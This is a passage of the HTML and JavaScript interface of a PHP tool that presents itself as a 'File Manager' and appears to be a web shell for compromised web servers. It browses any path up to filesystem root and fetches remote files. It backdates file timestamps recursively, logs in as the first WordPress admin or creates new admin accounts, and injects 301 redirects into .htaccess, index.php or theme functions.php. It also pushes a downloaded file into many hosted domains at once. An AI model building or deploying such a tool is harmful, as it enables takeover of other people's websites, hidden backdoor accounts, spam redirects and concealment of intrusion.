            z-index: 1000;
        }

        .modal-content {
            background: var(--bg-secondary);
            border-radius: 1rem;
            padding: 1.5rem;
            max-width: 500px;
            width: 90%;
            border: 1px solid var(--border);
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1rem;
        }

        .modal-header h3 {
            font-size: 1.1rem;
        }

        .modal-close {
            background: none;
            border: none;
            color: var(--text-muted);
            font-size: 1.5rem;
            cursor: pointer;
        }

        .modal-close:hover {
            color: var(--danger);
        }

        .modal-footer {
            display: flex;
            justify-content: flex-end;
            gap: 0.5rem;
            margin-top: 1rem;
        }

        /* ===== UTILITIES ===== */
        .text-muted {
            color: var(--text-muted);
        }

        .flex {
            display: flex;
            gap: 0.5rem;
        }

        .flex-between {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .gap-1 { gap: 0.25rem; }
        .gap-2 { gap: 0.5rem; }
        .gap-3 { gap: 0.75rem; }
        .gap-4 { gap: 1rem; }

        .mt-1 { margin-top: 0.25rem; }
        .mt-2 { margin-top: 0.5rem; }
        .mt-3 { margin-top: 0.75rem; }
        .mt-4 { margin-top: 1rem; }

        .mb-1 { margin-bottom: 0.25rem; }
        .mb-2 { margin-bottom: 0.5rem; }
        .mb-3 { margin-bottom: 0.75rem; }
        .mb-4 { margin-bottom: 1rem; }

        /* Responsive */
        @media (max-width: 768px) {
            .file-manager {
                flex-direction: column;
            }
            .sidebar {
                width: 100%;
                height: auto;
                border-right: none;
                border-bottom: 1px solid var(--border);
            }
            .file-item {
                flex-wrap: wrap;
            }
            .file-actions {
                width: 100%;
                justify-content: flex-start;
            }
        }
    </style>
</head>
<body>
    <div class="file-manager">
        <!-- SIDEBAR -->
        <div class="sidebar">
            <div class="flex-between mb-4">
                <h2 style="color: var(--accent);"><i class="fas fa-folder-open"></i> File Manager</h2>
                <a href="Log.php" class="btn btn-sm btn-danger"><i class="fas fa-sign-out-alt"></i> Logout</a>
            </div>

            <!-- STATUS ROLE -->
            <div class="card">
                <div class="flex-between">
                    <span><i class="fas fa-user"></i> Role: <strong><?= ucfirst($userRole) ?></strong></span>
                    <?php if (!$isAdmin): ?>
                        <span class="text-muted" style="font-size:0.75rem;">(guest)</span>
                    <?php endif; ?>
                </div>
            </div>

            <!-- CREATE FILE -->
            <div class="card">
                <h3><i class="fas fa-file"></i> Create File</h3>
                <form method="post">
                    <input type="text" name="fileName" placeholder="File name" required>
                    <button type="submit" name="createFile" class="btn btn-primary" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-plus"></i> Create</button>
                </form>
            </div>

            <!-- CREATE FOLDER -->
            <div class="card">
                <h3><i class="fas fa-folder"></i> Create Folder</h3>
                <form method="post">
                    <input type="text" name="folderName" placeholder="Folder name" required>
                    <button type="submit" name="createFolder" class="btn btn-primary" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-plus"></i> Create</button>
                </form>
            </div>

            <!-- UPLOAD FILE -->
            <div class="card">
                <h3><i class="fas fa-upload"></i> Upload Files</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="fileToUpload[]" multiple required>
                    <button type="submit" name="upload" class="btn btn-primary" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-upload"></i> Upload</button>
                </form>
            </div>

            <!-- DOWNLOAD FROM URL -->
            <div class="card">
                <h3><i class="fas fa-cloud-download-alt"></i> Download from URL</h3>
                <form method="post">
                    <input type="url" name="fileUrl" placeholder="https://example.com/file.zip" required>
                    <input type="text" name="fileUrlName" placeholder="Custom filename (optional)">
                    <button type="submit" name="downloadFromUrl" class="btn btn-primary" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-download"></i> Download</button>
                </form>
            </div>

            <!-- SEARCH CARD -->
            <div class="card">
                <h3><i class="fas fa-search"></i> Advanced Search</h3>
                <button type="button" class="btn btn-primary w-100" onclick="showSearchModal()"><i class="fas fa-search"></i> Open Search</button>
            </div>

            <!-- SCAN CARD -->
            <div class="card">
                <h3><i class="fas fa-shield-alt"></i> Security Scan</h3>
                <button type="button" class="btn btn-warning w-100" onclick="showScanModal()"><i class="fas fa-scan"></i> Run Scan</button>
                <?php if (!empty($_SESSION['scan_result_file']) && file_exists($_SESSION['scan_result_file'])): ?>
                    <a href="?downloadScan=1" class="btn btn-success w-100 mt-2"><i class="fas fa-download"></i> Download Last Scan</a>
                <?php endif; ?>
            </div>

            <!-- DEPLOY FILE -->
            <?php if ($isAdmin): ?>
            <div class="card">
                <h3><i class="fas fa-rocket"></i> Deploy File</h3>
                <button type="button" class="btn btn-info w-100" onclick="showDeployModal()"><i class="fas fa-cloud-upload-alt"></i> Deploy to Domains</button>
            </div>
            <?php endif; ?>

            <!-- REDIRECT 301 -->
            <?php if ($isAdmin): ?>
            <div class="card">
                <h3><i class="fas fa-redirect"></i> Redirect 301</h3>
                <button type="button" class="btn btn-warning w-100" onclick="showRedirectModal()"><i class="fas fa-link"></i> Create Redirect</button>
            </div>
            <?php endif; ?>

            <!-- SYNC TIMESTAMP -->
            <div class="card">
            <h3><i class="fas fa-clock"></i> Sync Timestamp</h3>
            <form method="post">
                <input type="text" name="ts_target" placeholder="Target path" required>
                <div class="flex gap-2">
                    <input type="date" name="ts_date" required style="flex:1;">
                    <input type="time" name="ts_time" required style="flex:1;">
                </div>
                <label class="flex gap-1"><input type="checkbox" name="ts_recursive" value="1" checked> Recursive</label>
                <button type="submit" name="doSyncTimestamp" class="btn btn-primary" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-sync"></i> Sync</button>
            </form>
        </div>

            <!-- ADMIN WORDPRESS -->
             <?php if ($isAdmin): ?>
            <div class="card">
                <h3><i class="fab fa-wordpress"></i> WordPress Admin</h3>
                <button type="button" class="btn btn-primary w-100" onclick="showAdminModal()"><i class="fas fa-user-cog"></i> Admin Tools</button>
            </div>
            <?php endif; ?>
        </div>

        <!-- MAIN CONTENT -->
        <div class="main-content">
            <!-- Breadcrumb & Navigation -->
            <div class="breadcrumb">
                <?php if (count($_SESSION['dir_history']) > 1): ?>
                    <a href="?back_dir=1"><i class="fas fa-arrow-left"></i> Back</a>
                <?php else: ?>
                    <span class="text-muted"><i class="fas fa-arrow-left"></i> Back</span>
                <?php endif; ?>
                <span class="separator">|</span>
                <a href="?folder=<?= urlencode($rootDirectory) ?>"><i class="fas fa-home"></i> Home</a>
                <span class="separator">|</span>
                <a href="?folder=<?= urlencode($rootPath) ?>"><i class="fas fa-globe"></i> Root</a>
                <span class="separator">|</span>
                <span class="current"><i class="fas fa-folder-open"></i> <?= htmlspecialchars($directory) ?></span>
            </div>

            <!-- Quick path form -->
            <form method="get" class="flex gap-2 mb-4">
                <input type="text" name="folder" value="<?= htmlspecialchars($directory) ?>" placeholder="Full path" style="flex:1;">
                <button type="submit" class="btn btn-primary"><i class="fas fa-arrow-right"></i> Go</button>
            </form>

            <!-- Alert messages -->
            <?php if (isset($_SESSION['error'])): ?>
                <div class="alert error"><?= $_SESSION['error']; unset($_SESSION['error']); ?></div>
            <?php endif; ?>
            <?php if (isset($_SESSION['success'])): ?>
                <div class="alert success"><?= $_SESSION['success']; unset($_SESSION['success']); ?></div>
            <?php endif; ?>

            <!-- Search results display (jika ada) -->
            <?php if (!empty($_SESSION['search_results']) && is_array($_SESSION['search_results'])): ?>
                <?php
                $searchRoot = $_SESSION['search_root'] ?? '';
                $searchName = $_SESSION['search_name'] ?? '';
                $searchContent = $_SESSION['search_content'] ?? '';
                $searchStats = $_SESSION['search_stats'] ?? [];
                ?>
                <div class="card">
                    <div class="flex-between">
                        <h3><i class="fas fa-search"></i> Search Results</h3>
                        <button class="btn btn-sm" onclick="document.getElementById('search-results').style.display='none'"><i class="fas fa-times"></i></button>
                    </div>
                    <div class="text-muted mb-2">
                        Root: <code><?= htmlspecialchars($searchRoot) ?></code><br>
                        <?php if ($searchName): ?>Name: <code><?= htmlspecialchars($searchName) ?></code><br><?php endif; ?>
                        <?php if ($searchContent): ?>Content: <code><?= htmlspecialchars($searchContent) ?></code><br><?php endif; ?>
                        Folders scanned: <?= $searchStats['dirs'] ?? 0 ?>, Files scanned: <?= $searchStats['files'] ?? 0 ?>
                    </div>
                    <div style="max-height: 400px; overflow-y: auto;">
                        <table style="width:100%; border-collapse:collapse; font-size:0.8rem;">
                            <thead>
                                <tr style="border-bottom:1px solid var(--border);">
                                    <th>Type</th>
                                    <th>Path</th>
                                    <th>Detail</th>
                                    <th>Link</th>
                                </tr>
                            </thead>
                            <tbody>
                            <?php foreach ($_SESSION['search_results'] as $row): ?>
                                <tr style="border-bottom:1px solid var(--border);">
                                    <td style="padding:0.5rem;"><?= $row['type'] === 'name' ? ($row['kind'] === 'dir' ? '📁' : '📄') : '🔍' ?></td>
                                    <td style="padding:0.5rem;"><code><?= htmlspecialchars($row['path']) ?></code></td>
                                    <td style="padding:0.5rem;">
                                        <?php if ($row['type'] === 'content' && !empty($row['lines'])): ?>
                                            <?php foreach ($row['lines'] as $ln): ?>
                                                <div>Line <?= $ln['line'] ?>: <code><?= htmlspecialchars(substr($ln['snippet'], 0, 50)) ?><?= strlen($ln['snippet'])>50?'...':'' ?></code></div>
                                            <?php endforeach; ?>
                                        <?php else: ?>
                                            -
                                        <?php endif; ?>
                                    </td>
                                    <td style="padding:0.5rem;">
                                        <?php if (!empty($row['full'])): ?>
                                            <a href="<?= htmlspecialchars(getDirectLink($row['full'])) ?>" target="_blank"><i class="fas fa-external-link-alt"></i></a>
                                        <?php endif; ?>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                </div>
                <?php unset($_SESSION['search_results'], $_SESSION['search_stats'], $_SESSION['search_root'], $_SESSION['search_name'], $_SESSION['search_content']); ?>
            <?php endif; ?>

            <!-- Multi-select action bar -->
            <form id="multiActionForm" method="post" class="flex gap-2 mb-3">
                <button type="button" class="btn btn-sm" onclick="selectAll(true)"><i class="fas fa-check-square"></i> All</button>
                <button type="button" class="btn btn-sm" onclick="selectAll(false)"><i class="fas fa-square"></i> None</button>
                <button type="submit" name="deleteSelected" class="btn btn-sm btn-danger" onclick="return confirm('Delete selected?')" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-trash"></i> Delete</button>
                <input type="text" name="chmodSelectedValue" placeholder="chmod (e.g., 755)" style="width:80px;" pattern="[0-7]{3,4}">
                <button type="submit" name="chmodSelected" class="btn btn-sm" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-lock"></i> Chmod</button>
                <select name="archive_format" style="width:100px;">
                    <option value="zip">ZIP</option>
                    <option value="tar">TAR</option>
                    <option value="tar.gz">TAR.GZ</option>
                    <option value="tar.bz2">TAR.BZ2</option>
                </select>
                <button type="submit" name="zipSelected" class="btn btn-sm btn-success" <?= !($isAdmin || $isTeman) ? 'disabled' : '' ?>><i class="fas fa-file-archive"></i> Archive</button>
            </form>

            <!-- File list header -->
            <div class="file-item" style="background:var(--bg-tertiary); font-weight:bold; border-radius:0.5rem 0.5rem 0 0;">
                <div class="file-icon"></div>
                <div class="file-name">Name</div>
                <div class="file-size">Size</div>
                <div class="file-perm">Perm</div>
                <div class="file-date">Modified</div>
                <div class="file-actions">Actions</div>
            </div>

            <!-- File list items -->
            <div class="file-list">
                <?php
                $no = 0;
                foreach ($filesAndFolders as $item):
                    $no++;
                    $fullpath = $directory . '/' . $item;
                    $colorClass = getPermissionColor($fullpath);
                    $perms = (is_readable($fullpath) && @fileperms($fullpath)) ? substr(sprintf('%o', fileperms($fullpath)), -4) : '----';
                    $timestamp = @filemtime($fullpath);
                    $dateModified = $timestamp ? date('Y-m-d H:i', $timestamp) : '-';
                    $sizeDisplay = is_file($fullpath) ? getNiceSize(@filesize($fullpath)) : (is_dir($fullpath) ? '📁' : '-');
                    $isHtaccess = (basename($fullpath) === '.htaccess');
                ?>
                <div class="file-item <?= $colorClass ?>">
                    <div class="file-checkbox">
                        <input type="checkbox" class="select-item" name="selectedItems[]" value="<?= htmlspecialchars($item) ?>" form="multiActionForm">
                    </div>
                    <div class="file-icon">
                        <?php if (is_dir($fullpath)): ?>
                            <i class="fas fa-folder"></i>
                        <?php else: ?>
                            <?= getFileEmoji($item) ?>
                        <?php endif; ?>
                    </div>
                    <div class="file-name">
                        <?php if (is_dir($fullpath)): ?>
                            <a href="?folder=<?= urlencode($fullpath) ?>" title="<?= htmlspecialchars($item) ?>"><?= htmlspecialchars($item) ?></a>
                        <?php else: ?>
                            <form method="post" style="display:inline;">
                                <input type="hidden" name="fileNameToEdit" value="<?= htmlspecialchars($item) ?>">
                                <button type="submit" name="edit" style="background:none; border:none; color:var(--text); cursor:pointer; text-decoration:underline;" title="Edit"><?= htmlspecialchars($item) ?></button>
                            </form>
                        <?php endif; ?>
                    </div>
                    <div class="file-size"><?= $sizeDisplay ?></div>
                    <div class="file-perm"><?= $perms ?></div>
                    <div class="file-date"><?= $dateModified ?></div>
                    <div class="file-actions">
                        <!-- Direct link -->
                        <a href="<?= htmlspecialchars(getDirectLink($fullpath)) ?>" target="_blank" class="btn btn-sm" title="Direct link"><i class="fas fa-link"></i></a>

                        <!-- Download -->
                        <a href="?download=<?= urlencode($fullpath) ?>" class="btn btn-sm" title="Download"><i class="fas fa-download"></i></a>

                        <!-- View (only files) -->
                        <?php if (is_file($fullpath) && is_readable($fullpath) && ($isAdmin || ($isTeman && !$isHtaccess))): ?>
                            <a href="?view=<?= urlencode($fullpath) ?>" class="btn btn-sm" title="View"><i class="fas fa-eye"></i></a>
                        <?php endif; ?>

                        <!-- Rename (admin only) -->
                        <?php if ($isAdmin || ($isTeman && !$isHtaccess)): ?>
                        <form method="post" style="display:inline;">
                            <input type="hidden" name="oldName" value="<?= htmlspecialchars($item) ?>">
                            <input type="text" name="newName" placeholder="new name" style="width:80px; display:none;" class="rename-input">
                            <button type="button" class="btn btn-sm rename-btn" onclick="this.style.display='none'; this.parentNode.querySelector('.rename-input').style.display='inline'; this.parentNode.querySelector('button[name=rename]').style.display='inline';"><i class="fas fa-pencil-alt"></i></button>
                            <button type="submit" name="rename" style="display:none;" class="btn btn-sm btn-success"><i class="fas fa-check"></i></button>
                        </form>
                        <?php endif; ?>

                        <!-- Chmod (admin only) -->
                        <?php if ($isAdmin): ?>
                        <form method="post" style="display:inline;">
                            <input type="hidden" name="nameToChmod" value="<?= htmlspecialchars($item) ?>">
                            <input type="text" name="perm" placeholder="755" style="width:40px;">
                            <button type="submit" name="chmod" class="btn btn-sm"><i class="fas fa-lock"></i></button>
                        </form>
                        <?php endif; ?>

                        <!-- Delete (admin only) -->
                        <?php if ($isAdmin || ($isTeman && !$isHtaccess)): ?>
                        <form class="ajax-delete-form" data-name="<?= htmlspecialchars($item) ?>" style="display:inline;">
                            <input type="hidden" name="target" value="<?= htmlspecialchars($item) ?>">
                            <button type="button" class="btn btn-sm btn-danger delete-btn"><i class="fas fa-trash"></i></button>
                        </form>
                        <?php endif; ?>

                        <!-- Archive (zip) untuk item tunggal -->
                        <?php if ($isAdmin): ?>
                        <form method="post" style="display:inline;">
                            <input type="hidden" name="itemToZip" value="<?= htmlspecialchars($item) ?>">
                            <button type="submit" name="zip" class="btn btn-sm" title="Zip"><i class="fas fa-file-archive"></i></button>
                        </form>
                        <?php endif; ?>

                        <!-- Extract if archive -->
                        <?php
                        $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
                        $isArchive = in_array($ext, ['zip', 'tar', 'gz', 'bz2', 'rar']) || substr($item, -7) == '.tar.gz' || substr($item, -8) == '.tar.bz2';
                        if ($isArchive && $isAdmin):
                        ?>
                        <button type="button" class="btn btn-sm extract-btn" data-archive="<?= htmlspecialchars($item) ?>"><i class="fas fa-file-export"></i> Extract</button>
                        <?php endif; ?>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>

            <!-- Pagination -->
            <?php if ($totalPages > 1): ?>
                <div class="pagination">
                    <?php for ($i = 1; $i <= $totalPages; $i++): ?>
                        <?php if ($i == $page): ?>
                            <span class="page-link disabled"><?= $i ?></span>
                        <?php else: ?>
                            <a class="page-link" href="?folder=<?= urlencode($directory) ?>&page=<?= $i ?>"><?= $i ?></a>
                        <?php endif; ?>
                    <?php endfor; ?>
                </div>
            <?php endif; ?>
        </div>
    </div>

    <!-- MODAL SEARCH LANJUTAN -->
    <div id="searchModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3><i class="fas fa-search"></i> Advanced Search</h3>
                <button class="modal-close" onclick="closeSearchModal()">&times;</button>
            </div>
            <form method="post" id="searchForm">
                <input type="hidden" name="runSearch" value="1">
                <label>Root path (leave empty for current)</label>
                <input type="text" name="search_root" value="<?= htmlspecialchars($directory) ?>">

                <label>Filename contains (optional)</label>
                <input type="text" name="search_name" placeholder="e.g., config">

                <label>File content contains (optional)</label>
                <input type="text" name="search_content" placeholder="e.g., password">

                <div class="checkbox-group">
                <label>
                    <input type="checkbox" name="search_regex" value="1"> Use regex
                </label>
                </div>

                <label>File extensions (comma separated, e.g., php,html,txt)</label>
                <input type="text" name="search_extensions" placeholder="php,html,txt">

                <div class="flex gap-2">
                    <div style="flex:1;">
                        <label>Min size (KB)</label>
                        <input type="number" name="search_min_size" min="0" step="1">
                    </div>
                    <div style="flex:1;">
                        <label>Max size (KB)</label>
                        <input type="number" name="search_max_size" min="0" step="1">
                    </div>
                </div>

                <div class="flex gap-2">
                    <div style="flex:1;">
                        <label>Date from (YYYY-MM-DD)</label>
                        <input type="date" name="search_date_from">
                    </div>
                    <div style="flex:1;">
                        <label>Date to</label>
                        <input type="date" name="search_date_to">
                    </div>
                </div>

                <div class="modal-footer">
                    <button type="button" class="btn" onclick="closeSearchModal()">Cancel</button>
                    <button type="submit" class="btn btn-primary">Search</button>
                </div>
            </form>
        </div>
    </div>

    <!-- MODAL EXTRACT -->
    <div id="extractModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Extract Archive</h3>
                <button class="modal-close" onclick="closeExtractModal()">&times;</button>
            </div>
            <form method="post">
                <input type="hidden" name="archive_file" id="extract-archive-file">
                <label>Destination directory</label>
                <input type="text" name="extract_dest" id="extract-dest" value="<?= htmlspecialchars($directory) ?>" required>
                <div class="modal-footer">
                    <button type="button" class="btn" onclick="closeExtractModal()">Cancel</button>
                    <button type="submit" name="extractArchive" class="btn btn-primary">Extract</button>
                </div>
            </form>
        </div>
    </div>

    <!-- MODAL EDIT FILE (CodeMirror) -->
    <div id="editModal" class="modal">
        <div class="modal-content" style="max-width:800px; width:90%;">
            <div class="modal-header">
                <h3><i class="fas fa-edit"></i> Edit File: <span id="edit-filename"></span></h3>
                <button class="modal-close" onclick="closeEditModal()">&times;</button>
            </div>
            <div style="border:1px solid var(--border); border-radius:6px; overflow:hidden;">
                <textarea id="edit-content" style="display:none;"></textarea>
                <div id="editor-container"></div>
            </div>
            <div class="modal-footer">
                <button class="btn" onclick="closeEditModal()">Cancel</button>
                <button class="btn btn-primary" onclick="saveEdit()"><i class="fas fa-save"></i> Save</button>
            </div>
        </div>
    </div>

    <!-- MODAL ADMIN WORDPRESS -->
    <div id="adminModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>WordPress Admin Tools</h3>
                <button class="modal-close" onclick="closeAdminModal()">&times;</button>
            </div>
            <div>
                <h4>Auto-login as first admin</h4>
                <input type="password" id="admin-pin" placeholder="PIN">
                <button class="btn btn-primary" onclick="adminLogin()">Login</button>

                <hr style="margin:1rem 0; border-color:var(--border);">

                <h4>Create new admin user</h4>
                <input type="text" id="admin-new-user" placeholder="Username">
                <input type="password" id="admin-new-pass" placeholder="Password">
                <input type="email" id="admin-new-email" placeholder="Email (optional)">
                <button class="btn btn-success" onclick="adminCreateUser()">Create</button>
            </div>
        </div>
    </div>

    <!-- MODAL REDIRECT 301 -->
    <div id="redirectModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Create 301 Redirect</h3>
                <button class="modal-close" onclick="closeRedirectModal()">&times;</button>
            </div>
            <form method="post" id="redirectForm">
                <input type="hidden" name="runRedirect301" value="1">
                <label>Target file:</label>
                <select name="redirect_target_type">
                    <option value="htaccess">.htaccess (Document Root)</option>
                    <option value="index">index.php (Document Root)</option>
                    <option value="theme">Theme functions.php</option>
                </select>

                <label>Source URL/path (e.g., /old-page or homepage)</label>
                <input type="text" name="redirect_source" required>

                <label>Destination URL</label>
                <input type="url" name="redirect_target_url" value="<?= htmlspecialchars($redirectTargetDefault) ?>" required>

                <div class="modal-footer">
                    <button type="button" class="btn" onclick="closeRedirectModal()">Cancel</button>
                    <button type="submit" class="btn btn-primary">Create</button>
                </div>
            </form>
        </div>
    </div>

    <!-- MODAL SCAN -->
    <div id="scanModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Security Scan</h3>
                <button class="modal-close" onclick="closeScanModal()">&times;</button>
            </div>
            <form method="post" id="scanForm">
                <label><input type="checkbox" name="scanHtaccess" value="1"> Scan .htaccess files</label><br>
                <label><input type="checkbox" name="scanLocked" value="1"> Scan locked folders</label><br>
                <label><input type="checkbox" name="scanWpAdmin" value="1" onchange="toggleWpVersion('admin')"> Scan wp-admin (checksum)</label>
                <div id="wpVersionAdminBox" style="display:none; margin-left:1rem;">
                    <input type="text" name="wpVersionAdmin" placeholder="WP version (auto if empty)">
                </div>
                <label><input type="checkbox" name="scanWpIncludes" value="1" onchange="toggleWpVersion('includes')"> Scan wp-includes (checksum)</label>
                <div id="wpVersionIncludesBox" style="display:none; margin-left:1rem;">
                    <input type="text" name="wpVersionIncludes" placeholder="WP version (auto if empty)">
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn" onclick="closeScanModal()">Cancel</button>
                    <button type="submit" class="btn btn-primary">Run Scan</button>
                </div>
            </form>
        </div>
    </div>

    <!-- MODAL DEPLOY -->
    <div id="deployModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Deploy File to Domains</h3>
                <button class="modal-close" onclick="closeDeployModal()">&times;</button>
            </div>
            <?php
            $deployItems = isset($_SESSION['deploy_scan_items']) ? $_SESSION['deploy_scan_items'] : [];
            ?>
            <form method="post" id="deployForm">
                <?php if (empty($deployItems)): ?>
                    <p>No domains scanned yet. Click "Scan Folders" first.</p>
                    <button type="submit" name="deployScanDomains" class="btn btn-primary">Scan Domains</button>
                <?php else: ?>
                    <p>Select target domains:</p>
                    <div style="max-height:200px; overflow-y:auto; border:1px solid var(--border); padding:0.5rem; border-radius:0.5rem;">
                        <?php foreach ($deployItems as $idx => $info): ?>
                            <label style="display:block; margin-bottom:0.25rem;">
                                <input type="checkbox" name="deploy_file_targets[]" value="<?= $idx ?>">
                                <strong><?= htmlspecialchars($info['label']) ?></strong><br>
                                <span class="text-muted"><?= htmlspecialchars($info['target']) ?></span>
                            </label>
                        <?php endforeach; ?>
                    </div>

                    <label class="mt-2">File URL</label>
                    <input type="url" name="deploy_file_url" required>

                    <label>Custom filename (optional)</label>
                    <input type="text" name="deploy_file_name">

                    <label>Subpath inside domain (optional)</label>
                    <input type="text" name="deploy_file_path" placeholder="e.g., wp-content/plugins">

                    <div class="modal-footer">
                        <button type="button" class="btn" onclick="closeDeployModal()">Cancel</button>
                        <button type="submit" name="deployRunFile" class="btn btn-primary">Deploy</button>
                    </div>
                <?php endif; ?>
                <button type="submit" name="deployReset" class="btn btn-sm mt-2">Reset Scan</button>
            </form>
        </div>
    </div>

    <script>
        
        // ==================== UTILITY FUNCTIONS ====================
        function selectAll(checked) {
            document.querySelectorAll('.select-item').forEach(cb => cb.checked = checked);
        }

        // ==================== AJAX DELETE ====================
        document.querySelectorAll('.ajax-delete-form').forEach(form => {
            form.querySelector('.delete-btn').addEventListener('click', function() {
                if (!confirm('Delete this item?')) return;
                const name = form.dataset.name;
                const formData = new FormData();
                formData.append('target', name);
                fetch('?ajax_delete=1&folder=<?= urlencode($directory) ?>', {
                    method: 'POST',
                    body: formData
                })
                .then(res => res.json())
                .then(data => {
                    if (data.success) location.reload();
                    else alert('Delete failed');
                });
            });
        });

        // ==================== EXTRACT BUTTON ====================
        document.querySelectorAll('.extract-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.getElementById('extract-archive-file').value = this.dataset.archive;
                document.getElementById('extract-dest').value = '<?= htmlspecialchars($directory) ?>';
                document.getElementById('extractModal').style.display = 'flex';
            });
        });

        function closeExtractModal() {
            document.getElementById('extractModal').style.display = 'none';
        }

        // ==================== SEARCH MODAL ====================
        function showSearchModal() {
            document.getElementById('searchModal').style.display = 'flex';
        }
        function closeSearchModal() {
            document.getElementById('searchModal').style.display = 'none';
        }

        // ==================== ADMIN MODAL ====================
        function showAdminModal() {
            document.getElementById('adminModal').style.display = 'flex';
        }
        function closeAdminModal() {
            document.getElementById('adminModal').style.display = 'none';
        }
        function adminLogin() {
            const pin = document.getElementById('admin-pin').value;
            if (!pin) return alert('PIN required');
            const form = document.createElement('form');
            form.method = 'post';
            form.innerHTML = `<input type="hidden" name="admin_pin" value="${escapeHtml(pin)}"><input type="hidden" name="auto_admin_login" value="1">`;
            document.body.appendChild(form);
            form.submit();
        }
        function adminCreateUser() {
            const pin = document.getElementById('admin-pin').value;
            const user = document.getElementById('admin-new-user').value;
            const pass = document.getElementById('admin-new-pass').value;
            const email = document.getElementById('admin-new-email').value;
            if (!pin || !user || !pass) return alert('PIN, username, and password required');
            const form = document.createElement('form');
            form.method = 'post';
            form.innerHTML = `
                <input type="hidden" name="admin_pin" value="${escapeHtml(pin)}">
                <input type="hidden" name="admin_new_user" value="${escapeHtml(user)}">
                <input type="hidden" name="admin_new_pass" value="${escapeHtml(pass)}">
                <input type="hidden" name="admin_new_email" value="${escapeHtml(email)}">
                <input type="hidden" name="create_admin_user" value="1">
            `;
            document.body.appendChild(form);
            form.submit();
        }

        // ==================== REDIRECT MODAL ====================
        function showRedirectModal() {
            document.getElementById('redirectModal').style.display = 'flex';
        }
        function closeRedirectModal() {
            document.getElementById('redirectModal').style.display = 'none';
        }

        // ==================== SCAN MODAL ====================
        function showScanModal() {
            document.getElementById('scanModal').style.display = 'flex';
        }
        function closeScanModal() {
            document.getElementById('scanModal').style.display = 'none';
        }
        function toggleWpVersion(type) {
            const cb = document.getElementById(type === 'admin' ? 'scanWpAdmin' : 'scanWpIncludes');
            const box = document.getElementById(type === 'admin' ? 'wpVersionAdminBox' : 'wpVersionIncludesBox');
            if (cb.checked) box.style.display = 'block';
            else box.style.display = 'none';
        }

        // ==================== DEPLOY MODAL ====================
        function showDeployModal() {
            document.getElementById('deployModal').style.display = 'flex';
        }
        function closeDeployModal() {
            document.getElementById('deployModal').style.display = 'none';
        }

        // Escape HTML helper untuk admin modal
        function escapeHtml(unsafe) {
            return unsafe.replace(/[&<>"]/g, function(m) {
                if (m === '&') return '&amp;';
                if (m === '<') return '&lt;';
                if (m === '>') return '&gt;';
                if (m === '"') return '&quot;';
                return m;
            });
        }

        // Close modals when clicking outside
        window.onclick = function(event) {
            if (event.target.classList.contains('modal')) {
                event.target.style.display = 'none';
            }
        }

        // ==================== EDITOR MODAL ====================
        let editorInstance = null;
        let currentEditFile = '';

        function openEditModal(filename) {
            currentEditFile = filename;
            document.getElementById('edit-filename').innerText = filename;
            document.getElementById('editModal').style.display = 'flex';

            // Fetch konten file
            fetch('?get_file_content=' + encodeURIComponent(filename) + '&folder=<?= urlencode($directory) ?>')
                .then(response => {
                    if (!response.ok) throw new Error('Gagal mengambil konten');
                    return response.text();
                })
                .then(content => {
                    const textarea = document.getElementById('edit-content');
                    textarea.value = content;

                    // Inisialisasi CodeMirror jika belum ada
                    if (!editorInstance) {
                        editorInstance = CodeMirror(document.getElementById('editor-container'), {
                            value: content,
                            lineNumbers: true,
                            mode: 'php', // default, nanti bisa dideteksi dari ekstensi
                            theme: 'default',
                            indentUnit: 4,
                            tabSize: 4,
                            lineWrapping: true
                        });
                    } else {
                        editorInstance.setValue(content);
                    }

                    // Deteksi mode berdasarkan ekstensi
                    const ext = filename.split('.').pop().toLowerCase();
                    const modeMap = {
                        'php': 'php',
                        'html': 'htmlmixed',
                        'htm': 'htmlmixed',
                        'js': 'javascript',
                        'css': 'css',
                        'xml': 'xml',
                        'json': 'javascript',
                        'txt': 'text/plain'
                    };
                    editorInstance.setOption('mode', modeMap[ext] || 'php');
                    editorInstance.refresh();
                })
                .catch(err => {
                    alert('Error: ' + err.message);
                    closeEditModal();
                });
        }

        function closeEditModal() {
            document.getElementById('editModal').style.display = 'none';
            if (editorInstance) {
                // Jangan hancurkan instance, hanya sembunyikan
            }
        }

        function saveEdit() {
            if (!editorInstance) return;
            const content = editorInstance.getValue();

            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({
                    'save_edit': '1',
                    'file': currentEditFile,
                    'content': content
                })
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    // Tampilkan notifikasi sukses (toast)
                    const toast = document.createElement('div');
                    toast.className = 'alert success';
                    toast.style.position = 'fixed';
                    toast.style.bottom = '20px';
                    toast.style.right = '20px';
                    toast.style.zIndex = '9999';
                    toast.innerHTML = 'File saved successfully.';
                    document.body.appendChild(toast);
                    setTimeout(() => toast.remove(), 3000);
                    closeEditModal();
                } else {
                    alert('Error: ' + (data.error || 'Unknown error'));
                }
            })
            .catch(err => alert('Error: ' + err.message));
        }

        // Ubah semua tombol edit agar membuka modal
        document.addEventListener('DOMContentLoaded', function() {
            // Ganti semua form edit dengan tombol yang memanggil openEditModal
            document.querySelectorAll('.file-item form button[name="edit"]').forEach(btn => {
                btn.addEventListener('click', function(e) {
                    e.preventDefault();
